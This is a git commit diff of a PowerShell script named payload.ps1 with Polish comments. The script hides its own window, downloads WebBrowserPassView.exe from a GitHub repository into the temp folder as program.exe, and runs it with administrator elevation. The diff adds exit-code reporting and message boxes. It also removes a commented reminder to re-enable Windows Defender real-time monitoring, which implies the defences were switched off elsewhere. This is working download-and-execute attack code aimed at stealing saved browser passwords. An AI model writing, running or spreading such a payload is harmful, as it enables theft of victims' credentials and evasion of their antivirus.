55c39606c65f57e865414a066f00f3dda3edebc4
NikodemM <ola1091331@gmail.com>
2025-08-14 23:45:12 +0200

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,7 +1,7 @@
-# Minimalizacja okna
-$null = (Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name 'Win32ShowWindowAsync' -Namespace Win32Functions -PassThru)::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle), 6)
+# Minimalizuj okno
+$null = (Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);' -Name 'Win32ShowWindowAsync' -Namespace Win32Functions -PassThru)::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess().MainWindowHandle), 0)
 
-# Pobierz i wykonaj plik EXE
+# Pobierz i uruchom aplikację
 $exeUrl = "https://github.com/dfassdaopiju/XzxX/blob/main/WebBrowserPassView.exe"
 $exePath = "$env:TEMP\program.exe"
 
@@ -14,11 +14,24 @@ try {
     $psi.FileName = $exePath
     $psi.Verb = "runas"
     $psi.UseShellExecute = $true
-    [System.Diagnostics.Process]::Start($psi) | Out-Null
+    $process = [System.Diagnostics.Process]::Start($psi)
+    
+    # Czekaj na zakończenie i zwróć wynik
+    $process.WaitForExit()
+    $exitCode = $process.ExitCode
+    
+    # Zapisz wynik do pliku
+    "ExitCode: $exitCode" | Out-File "$env:TEMP\app_result.txt"
+    
+    # Komunikat sukcesu
+    if ($exitCode -eq 0) {
+        [System.Windows.Forms.MessageBox]::Show("Aplikacja wykonana pomyślnie (kod: $exitCode)", "Sukces", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+    } else {
+        [System.Windows.Forms.MessageBox]::Show("Aplikacja zakończona kodem błędu: $exitCode", "Ostrzeżenie", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
+    }
 }
 catch {
-    Write-Output "Error: $_"
+    $errorMsg = $_.Exception.Message
+    [System.Windows.Forms.MessageBox]::Show("BŁAD: $errorMsg", "Krytyczny Błąd", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
+    $errorMsg | Out-File "$env:TEMP\app_error.txt"
 }
-
-# Opcjonalnie: Przywróć Windows Defender po wykonaniu
-# Set-MpPreference -DisableRealtimeMonitoring $false
